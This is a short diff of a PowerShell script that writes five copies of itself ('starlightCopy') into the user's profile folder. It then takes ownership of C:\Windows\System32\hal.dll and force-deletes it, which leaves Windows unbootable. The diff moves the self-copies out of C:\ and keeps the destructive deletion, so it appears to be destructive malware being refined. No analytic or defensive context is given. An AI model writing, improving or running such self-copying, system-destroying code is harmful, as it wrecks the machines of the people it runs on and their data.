@@ -12,10 +12,9 @@ function Take-Ownership {
 }
 try {
 for ($i = 1; $i -le 5; $i++) {
-    New-Item -ItemType File -Path "C:\starlightCopy-$i.ps1"
-    Set-Content -Path "C:\copy$i.ps1" -Value $scriptContent
+    New-Item -ItemType File -Path "C:\Users\$env:USERNAME\starlightCopy-$i.ps1"
+    Set-Content -Path "C:\Users\$env:USERNAME\starlightCopy-$i.ps1" -Value $scriptContent
 }
-New-Item -ItemType File -Path "C:\"
 Take-Ownership -path "C:\Windows\System32\hal.dll"
 Remove-Item -Path "C:\Windows\System32\hal.dll" -Force
 } catch {
